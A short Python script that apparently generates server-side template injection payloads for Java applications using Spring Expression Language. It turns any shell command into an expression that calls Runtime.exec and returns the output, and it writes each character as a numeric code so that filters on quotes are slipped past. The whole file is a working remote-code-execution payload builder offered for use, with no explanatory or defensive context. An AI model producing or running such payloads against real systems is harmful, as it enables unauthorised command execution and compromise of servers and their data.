#! /bin/python3

command = input('Enter command:')


def injection(comm):
    build = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime()"
    first_ascii = str(ord(comm[0]))
    build += ".exec(T(java.lang.Character).toString(" + first_ascii + ")"
    comm = comm[1:]

    for letter in comm:
        letter_ascii = str(ord(letter))
        build += ".concat(T(java.lang.Character).toString(" + letter_ascii + "))"

    build += ").getInputStream())}"

    return build


print(injection(command))
